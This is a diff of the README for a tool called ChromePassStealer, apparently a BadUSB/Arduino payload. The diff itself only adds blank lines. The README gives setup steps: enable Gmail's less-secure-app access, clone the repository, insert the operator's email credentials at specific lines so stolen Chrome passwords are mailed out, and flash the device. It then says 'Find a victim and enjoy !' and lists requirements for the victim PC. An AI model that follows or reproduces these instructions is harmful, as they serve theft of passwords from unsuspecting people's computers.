@@ -20,17 +20,22 @@ You can customize the **delay** according to the speed in which you plug the **B
 # Getting Started ✔️
 ## Requirments
 1. Install **Arduino software** [here](https://www.arduino.cc/en/software).
+
 2. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps).
 ## Install
 1. Download this repository
+
 **Linux :**
 ```
 git clone https://github.com/tuconnaisyouknow/ChromePassStealer
 cd ChromePassStealer
 ```
 **Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
+
 2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.txt) or [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.ino) at line 238, 245, 253, 264
+
 3. Add your code in the **BadUSB** by **Arduino software**
+
 4. Find a victim and enjoy !
 ## Requirments for victim PC
 * Turn off caps lock
